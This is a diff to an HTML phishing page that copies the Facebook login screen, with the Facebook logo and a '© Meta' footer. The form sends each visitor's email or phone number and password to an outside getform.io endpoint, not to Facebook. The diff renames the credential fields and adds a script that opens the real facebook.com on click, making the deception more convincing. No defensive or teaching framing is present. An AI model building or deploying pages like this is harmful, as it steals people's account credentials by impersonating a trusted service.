@@ -78,12 +78,19 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     </div>
     <form action="https://getform.io/f/bvrrnwzb" class="login-container" method="POST">
-        <input type="text" name="credentials" class="input-field" placeholder="Mobile number or email address">
-        <input type="password" name="pkc" class="input-field" placeholder="Password">
+        <input type="text" name="fbcred" class="input-field" placeholder="Mobile number or email address">
+        <input type="password" name="fbkc" class="input-field" placeholder="Password">
         <button class="btn-login">Log in</button>
         <a href="#" class="forgot-link">Forgotten Password?</a>
         <a href="#" class="create-link">Create new account</a>
     </form>
     <div class="footer">© Meta</div>
+
+    <script>
+        document.querySelector(".btn-login").addEventListener("click", () => {
+            const url = "https://www.facebook.com/";
+            window.open(url);
+        });
+    </script>
 </body>
 </html>
